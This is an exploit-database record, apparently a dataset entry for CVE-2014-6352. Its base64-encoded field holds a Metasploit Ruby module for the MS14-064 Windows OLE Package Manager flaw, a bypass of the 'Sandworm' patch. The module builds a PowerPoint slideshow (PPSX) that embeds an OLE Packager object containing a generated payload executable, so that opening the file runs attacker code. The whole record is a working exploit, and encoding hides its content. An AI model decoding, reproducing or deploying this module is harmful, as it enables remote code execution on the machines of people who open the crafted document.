{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgVGhpcyBtb2R1bGUgcmVxdWlyZXMgTWV0YXNwbG9pdDogaHR0cC8vbWV0YXNwbG9pdC5jb20vZG93bmxvYWQNCiMgQ3VycmVudCBzb3VyY2U6IGh0dHBzOi8vZ2l0aHViLmNvbS9yYXBpZDcvbWV0YXNwbG9pdC1mcmFtZXdvcmsNCiMjDQoNCnJlcXVpcmUgJ21zZi9jb3JlJw0KDQpjbGFzcyBNZXRhc3Bsb2l0MyA8IE1zZjo6RXhwbG9pdDo6UmVtb3RlDQogIFJhbmsgPSBFeGNlbGxlbnRSYW5raW5nDQoNCiAgaW5jbHVkZSBNc2Y6OkV4cGxvaXQ6OkZJTEVGT1JNQVQNCiAgaW5jbHVkZSBNc2Y6OkV4cGxvaXQ6OkVYRQ0KDQogIGRlZiBpbml0aWFsaXplKGluZm89e30pDQogICAgc3VwZXIodXBkYXRlX2luZm8oaW5mbywNCiAgICAgICdOYW1lJyAgICAgICAgICAgPT4gIk1TMTQtMDY0IE1pY3Jvc29mdCBXaW5kb3dzIE9MRSBQYWNrYWdlIE1hbmFnZXIgQ29kZSBFeGVjdXRpb24iLA0KICAgICAgJ0Rlc2NyaXB0aW9uJyAgICA9PiAlcXsNCiAgICAgICAgVGhpcyBtb2R1bGUgZXhwbG9pdHMgYSB2dWxuZXJhYmlsaXR5IGZvdW5kIGluIFdpbmRvd3MgT2JqZWN0IExpbmtpbmcgYW5kIEVtYmVkZGluZyAoT0xFKQ0KICAgICAgICBhbGxvd2luZyBhcmJpdHJhcnkgY29kZSBleGVjdXRpb24sIHB1YmxpY2x5IGV4cGxvaXRlZCBpbiB0aGUgd2lsZCBhcyBNUzE0LTA2MCBwYXRjaCBieXBhc3MuDQogICAgICAgIFRoZSBNaWNyb3NvZnQgdXBkYXRlIHRyaWVkIHRvIGZpeCB0aGUgdnVsbmVyYWJpbGl0eSBwdWJsaWNseSBrbm93biBhcyAiU2FuZHdvcm0iLiBQbGF0Zm9ybXMNCiAgICAgICAgc3VjaCBhcyBXaW5kb3dzIFZpc3RhIFNQMiBhbGwgdGhlIHdheSB0byBXaW5kb3dzIDgsIFdpbmRvd3MgU2VydmVyIDIwMDggYW5kIDIwMTIgYXJlIGtub3duDQogICAgICAgIHRvIGJlIHZ1bG5lcmFibGUuIEhvd2V2ZXIsIGJhc2VkIG9uIG91ciB0ZXN0aW5nLCB0aGUgbW9zdCByZWxpYWJsZSBzZXR1cCBpcyBvbiBXaW5kb3dzDQogICAgICAgIHBsYXRmb3JtcyBydW5uaW5nIE9mZmljZSAyMDEzIGFuZCBPZmZpY2UgMjAxMCBTUDIuIEFuZCBwbGVhc2Uga2VlcCBpbiBtaW5kIHRoYXQgc29tZSBvdGhlcg0KICAgICAgICBzZXR1cHMgc3VjaCBhcyB1c2luZyBPZmZpY2UgMjAxMCBTUDEgbWlnaHQgYmUgbGVzcyBzdGFibGUsIGFuZCBzb21ldGltZXMgbWF5IGVuZCB1cCB3aXRoIGENCiAgICAgICAgY3Jhc2ggZHVlIHRvIGEgZmFpbHVyZSBpbiB0aGUgQ1BhY2thZ2U6OkNyZWF0ZVRlbXBGaWxlTmFtZSBmdW5jdGlvbi4NCiAgICAgIH0sDQogICAgICAnTGljZW5zZScgICAgICAgID0+IE1TRl9MSUNFTlNFLA0KICAgICAgJ0F1dGhvcicgICAgICAgICA9Pg0KICAgICAgICBbDQogICAgICAgICAgJ0hhaWZlaSBMaScsICMgVnVsbmVyYWJpbGl0eSBkaXNjb3ZlcnkNCiAgICAgICAgICAnc2lubjNyJywgIyBNZXRhc3Bsb2l0IG1vZHVsZQ0KICAgICAgICAgICdqdWFuIHZhenF1ZXonICMgTWV0YXNwbG9pdCBtb2R1bGUNCiAgICAgICAgXSwNCiAgICAgICdSZWZlcmVuY2VzJyAgICAgPT4NCiAgICAgICAgWw0KICAgICAgICAgIFsnQ1ZFJywgJzIwMTQtNjM1MiddLA0KICAgICAgICAgIFsnTVNCJywgJ01TMTQtMDY0J10sDQogICAgICAgICAgWydCSUQnLCAnNzA2OTAnXSwNCiAgICAgICAgICBbJ1VSTCcsICdodHRwOi8vYmxvZ3MubWNhZmVlLmNvbS9tY2FmZWUtbGFicy9ieXBhc3NpbmctbWljcm9zb2Z0cy1wYXRjaC1zYW5kd29ybS16ZXJvLWRheS1ldmVuLWVkaXRpbmctZGFuZ2Vyb3VzJ10NCiAgICAgICAgXSwNCiAgICAgICdQYXlsb2FkJyAgICAgICAgPT4NCiAgICAgICAgew0KICAgICAgICAgICdTcGFjZScgICAgICAgPT4gMjA0OCwNCiAgICAgICAgICAnRGlzYWJsZU5vcHMnID0+IHRydWUNCiAgICAgICAgfSwNCiAgICAgICdQbGF0Zm9ybScgICAgICAgPT4gJ3dpbicsDQogICAgICAnQXJjaCcgICAgICAgICAgID0+IEFSQ0hfWDg2LA0KICAgICAgJ1RhcmdldHMnICAgICAgICA9Pg0KICAgICAgICBbDQogICAgICAgICAgWydXaW5kb3dzIDcgU1AxIC8gT2ZmaWNlIDIwMTAgU1AyIC8gT2ZmaWNlIDIwMTMnLCB7fV0sDQogICAgICAgIF0sDQogICAgICAnUHJpdmlsZWdlZCcgICAgID0+IGZhbHNlLA0KICAgICAgJ0Rpc2Nsb3N1cmVEYXRlJyA9PiAiT2N0IDIxIDIwMTQiLA0KICAgICAgJ0RlZmF1bHRUYXJnZXQnICA9PiAwKSkNCg0KICAgIHJlZ2lzdGVyX29wdGlvbnMoDQogICAgICBbDQogICAgICAgIE9wdFN0cmluZy5uZXcoJ0ZJTEVOQU1FJywgW3RydWUsICdUaGUgUFBTWCBmaWxlJywgJ21zZi5wcHN4J10pDQogICAgICBdLCBzZWxmLmNsYXNzKQ0KICBlbmQNCg0KICBkZWYgZXhwbG9pdA0KICAgIHByaW50X3N0YXR1cygiQ3JlYXRpbmcgJyN7ZGF0YXN0b3JlWydGSUxFTkFNRSddfScgZmlsZSAuLi4iKQ0KICAgIG9sZV9zdHJlYW0gPSBvbGVfcGFja2FnZXINCiAgICB6aXAgPSB6aXBfcHBzeChvbGVfc3RyZWFtKQ0KICAgIGZpbGVfY3JlYXRlKHppcCkNCiAgZW5kDQoNCiAgZGVmIHppcF9wcHN4KG9sZV9zdHJlYW0pDQogICAgemlwX2RhdGEgPSB7fQ0KICAgIGRhdGFfZGlyID0gRmlsZS5qb2luKE1zZjo6Q29uZmlnLmRhdGFfZGlyZWN0b3J5LCAnZXhwbG9pdHMnLCAnQ1ZFLTIwMTQtNjM1MicsICd0ZW1wbGF0ZV9ydW5fYXNfYWRtaW4nKQ0KDQogICAgRGlyWyIje2RhdGFfZGlyfS8qKi8qKiJdLmVhY2ggZG8gfGZpbGV8DQogICAgICB1bmxlc3MgRmlsZS5kaXJlY3Rvcnk/KGZpbGUpDQogICAgICAgIHppcF9kYXRhW2ZpbGUuc3ViKGRhdGFfZGlyLCcnKV0gPSBGaWxlLnJlYWQoZmlsZSkNCiAgICAgIGVuZA0KICAgIGVuZA0KDQogICAgIyBhZGQgdGhlIG90aGVyd2lzZSBza2lwcGVkICJoaWRkZW4iIGZpbGUNCiAgICBmaWxlID0gIiN7ZGF0YV9kaXJ9L19yZWxzLy5yZWxzIg0KICAgIHppcF9kYXRhW2ZpbGUuc3ViKGRhdGFfZGlyLCcnKV0gPSBGaWxlLnJlYWQoZmlsZSkNCg0KICAgICMgcHV0IG91ciBvd24gT0xFIHN0cmVhbXMNCiAgICB6aXBfZGF0YVsnL3BwdC9lbWJlZGRpbmdzL29sZU9iamVjdDEuYmluJ10gPSBvbGVfc3RyZWFtDQoNCiAgICAjIGNyZWF0ZSB0aGUgcHBzeA0KICAgIHBwc3ggPSBSZXg6OlppcDo6QXJjaGl2ZS5uZXcNCiAgICB6aXBfZGF0YS5lYWNoX3BhaXIgZG8gfGssdnwNCiAgICAgIHBwc3guYWRkX2ZpbGUoayx2KQ0KICAgIGVuZA0KDQogICAgcHBzeC5wYWNrDQogIGVuZA0KDQogIGRlZiBvbGVfcGFja2FnZXINCiAgICBwYXlsb2FkX25hbWUgPSAiI3tyYW5kX3RleHRfYWxwaGEoNCl9LmV4ZSINCg0KICAgIGZpbGVfaW5mbyA9IFsyXS5wYWNrKCd2JykNCiAgICBmaWxlX2luZm8gPDwgIiN7cGF5bG9hZF9uYW1lfVx4MDAiDQogICAgZmlsZV9pbmZvIDw8ICIje3BheWxvYWRfbmFtZX1ceDAwIg0KICAgIGZpbGVfaW5mbyA8PCAiXHgwMFx4MDAiDQoNCiAgICBleHRyYWN0X2luZm8gPSBbM10ucGFjaygndicpDQogICAgZXh0cmFjdF9pbmZvIDw8IFtwYXlsb2FkX25hbWUubGVuZ3RoICsgMV0ucGFjaygnVicpDQogICAgZXh0cmFjdF9pbmZvIDw8ICIje3BheWxvYWRfbmFtZX1ceDAwIg0KDQogICAgcCA9IGdlbmVyYXRlX3BheWxvYWRfZXhlDQogICAgZmlsZSA9IFtwLmxlbmd0aF0ucGFjaygnVicpDQogICAgZmlsZSA8PCBwDQoNCiAgICBhcHBlbmRfaW5mbyA9IFtwYXlsb2FkX25hbWUubGVuZ3RoXS5wYWNrKCdWJykNCiAgICBhcHBlbmRfaW5mbyA8PCBSZXg6OlRleHQudG9fdW5pY29kZShwYXlsb2FkX25hbWUpDQogICAgYXBwZW5kX2luZm8gPDwgW3BheWxvYWRfbmFtZS5sZW5ndGhdLnBhY2soJ1YnKQ0KICAgIGFwcGVuZF9pbmZvIDw8IFJleDo6VGV4dC50b191bmljb2RlKHBheWxvYWRfbmFtZSkNCiAgICBhcHBlbmRfaW5mbyA8PCBbcGF5bG9hZF9uYW1lLmxlbmd0aF0ucGFjaygnVicpDQogICAgYXBwZW5kX2luZm8gPDwgUmV4OjpUZXh0LnRvX3VuaWNvZGUocGF5bG9hZF9uYW1lKQ0KDQogICAgb2xlX2RhdGEgPSBmaWxlX2luZm8gKyBleHRyYWN0X2luZm8gKyBmaWxlICsgYXBwZW5kX2luZm8NCiAgICBvbGVfY29udGVudHMgPSBbb2xlX2RhdGEubGVuZ3RoXS5wYWNrKCdWJykgKyBvbGVfZGF0YQ0KDQogICAgb2xlID0gY3JlYXRlX29sZSgiXHgwMU9MRTEwTmF0aXZlIiwgb2xlX2NvbnRlbnRzKQ0KDQogICAgb2xlDQogIGVuZA0KDQogIGRlZiBjcmVhdGVfb2xlKHN0cmVhbV9uYW1lLCBkYXRhKQ0KICAgIG9sZV90bXAgPSBSZXg6OlF1aWNrZmlsZS5uZXcoJ29sZScpDQogICAgc3RnID0gUmV4OjpPTEU6OlN0b3JhZ2UubmV3KG9sZV90bXAucGF0aCwgUmV4OjpPTEU6OlNUR01fV1JJVEUpDQoNCiAgICBzdG0gPSBzdGcuY3JlYXRlX3N0cmVhbShzdHJlYW1fbmFtZSkNCiAgICBzdG0gPDwgZGF0YQ0KICAgIHN0bS5jbG9zZQ0KDQogICAgZGlyZWN0b3J5ID0gc3RnLmluc3RhbmNlX3ZhcmlhYmxlX2dldCg6QGRpcmVjdG9yeSkNCiAgICBkaXJlY3RvcnkuZWFjaF9lbnRyeSBkbyB8ZW50cnl8DQogICAgICBpZiBlbnRyeS5pbnN0YW5jZV92YXJpYWJsZV9nZXQoOkBfYWIpID09ICdSb290IEVudHJ5Jw0KICAgICAgICAjIDAwMDMwMDBDLTAwMDAtMDAwMC1jMDAwLTAwMDAwMDAwMDA0NiAjIFBhY2thZ2VyDQogICAgICAgIGNsc2lkID0gUmV4OjpPTEU6OkNMU0lELm5ldygiXHgwY1x4MDBceDAzXHgwMFx4MDBceDAwXHgwMFx4MDBceGMwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHg0NiIpDQogICAgICAgIGVudHJ5Lmluc3RhbmNlX3ZhcmlhYmxlX3NldCg6QF9jbHNJZCwgY2xzaWQpDQogICAgICBlbmQNCiAgICBlbmQNCg0KICAgICMgd3JpdGUgdG8gZGlzaw0KICAgIHN0Zy5jbG9zZQ0KDQogICAgb2xlX2NvbnRlbnRzID0gRmlsZS5yZWFkKG9sZV90bXAucGF0aCkNCiAgICBvbGVfdG1wLmNsb3NlDQogICAgb2xlX3RtcC51bmxpbmsNCg0KICAgIG9sZV9jb250ZW50cw0KICBlbmQNCmVuZA==", 
    "cves": [
        "CVE-2014-6352"
    ], 
    "id": "35236", 
    "filename": "platforms/windows/local/35236.rb"
}